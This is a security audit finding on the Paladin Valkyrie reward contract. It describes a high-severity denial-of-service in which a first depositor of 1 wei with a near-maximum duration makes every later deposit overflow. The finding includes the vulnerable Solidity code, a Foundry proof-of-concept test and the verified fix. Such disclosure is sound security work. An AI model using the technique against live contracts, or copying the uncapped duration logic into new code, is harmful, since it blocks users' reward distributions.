---
tags:
  - lang/solidity
  - platform/cyfrin
  - has/github
  - severity/high
  - sector/dex
protocol: "[[Paladin Valkyrie]]"
auditors:
  - Draiakoo
report: "https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md"
genome:
  - "[[reentrancy-guard]]"
  - "[[use-reentrancy-guard]]"
  - "[[known-pattern]]"
---
# Reward distribution can be blocked by an initial distribution of long duration

- id: 61557
- impact: HIGH
- protocol: Paladin Valkyrie
- reporter: Draiakoo (Cyfrin)
- source: https://github.com/solodit/solodit_content/blob/main/reports/Cyfrin/2025-03-12-cyfrin-paladin-valkyrie-v2.0.md

## Summary


This bug report discusses an issue with the distribution of rewards in a permissionless system, where anyone can distribute a large amount of tokens with a duration longer than 1 week. The problem arises when there is an existing distribution active for a token and additional tokens are attempted to be distributed. The logic used to calculate the duration can result in a denial of service (DoS) attack if the initial duration is already set close to overflowing. This means that attackers can easily disrupt the distribution of any token by depositing a small amount and being the first distributor. A proof of concept has been provided to demonstrate the vulnerability. The report recommends constraining the duration to a maximum length as a mitigation strategy. The bug has been fixed by the team and verified by a third-party.

## Details

**Description:** Given that distribution of rewards is permissionless, anyone can distribute any arbitrary amount of tokens with a duration greater than 1 week. If there is an existing distribution active for a given token and additional tokens are attempted to be distributed, the duration will be added to the end date; however, this logic can result in a complete DoS if the initial duration is already set close to overflowing `type(uint32).max`.

```solidity
function depositRewards(IncentivizedPoolId id, address token, uint256 amount, uint256 duration)
    external
    override
    nonReentrant
{
    ...
    // Update the reward distribution parameters
    uint32 endTimestampCache = _state.endTimestamp;
    if (endTimestampCache < block.timestamp) {
        ...
    } else {
        // Calculates the remianing duration left for the current distribution
        uint256 remainingDuration = endTimestampCache - block.timestamp;
        if (remainingDuration + duration < MIN_DURATION) revert InvalidDuration();
        // And calculates the new duration
        uint256 newDuration = remainingDuration + duration;

        // Calculates the leftover rewards from the current distribution
        uint96 ratePerSecCache = _state.ratePerSec;
        uint256 leftoverRewards = ratePerSecCache * remainingDuration;

        // Calculates the new rate
        uint256 newRate = (amount + leftoverRewards) / newDuration;
        if (newRate < ratePerSecCache) revert CannotReduceRate();

        // Stores the new reward distribution parameters
        _state.ratePerSec = newRate.toUint96();
        _state.endTimestamp = (block.timestamp + newDuration).toUint32();
        _state.lastUpdateTime = (block.timestamp).toUint32();
    }
    ...
}
```

**Impact:** Attackers can freely DoS the distribution of any token by simply depositing 1 wei of the token and being the first distributor.

**Proof of Concept:** The following test should be placed in `BasicIncentiveLogic.t.sol`:
```solidity
    function test_DoSTokenIncentiveDistribution() public {
        PoolId poolKey;
        IncentivizedPoolId poolId;
        address lpToken = address(7);

        poolKey = createPoolKey(address(1), address(2), 3000).toId();
        poolId = IncentivizedPoolKey({ id: poolKey, lpToken: lpToken }).toId();

        manager.setListedPool(poolId, true);

        address[] memory systems = new address[](1);
        systems[0] = address(logic);

        manager.notifyAddLiquidty(systems, poolKey, lpToken, user1, int256(100 * 10 ** 18));

        uint256 amount = 1;
        uint256 duration = type(uint32).max - 1 - block.timestamp;

        logic.depositRewards(poolId, address(token0), amount, duration);

        skip(3 days);

        // If someone tries to deposit more tokens, the duration will overflow
        vm.expectRevert();
        logic.depositRewards(poolId, address(token0), 100 * 10 ** 18, 1 weeks);
    }
```

**Recommended Mitigation:** Consider constraining the duration to a maximum length.

**Paladin:** Fixed by commit [`c3298fa`](https://github.com/PaladinFinance/Valkyrie/pull/5/commits/c3298fa520787ca07034d055ac9c3f71aefebb67).

**Cyfrin:** Verified. A maximum incentive distribution duration has been implemented.
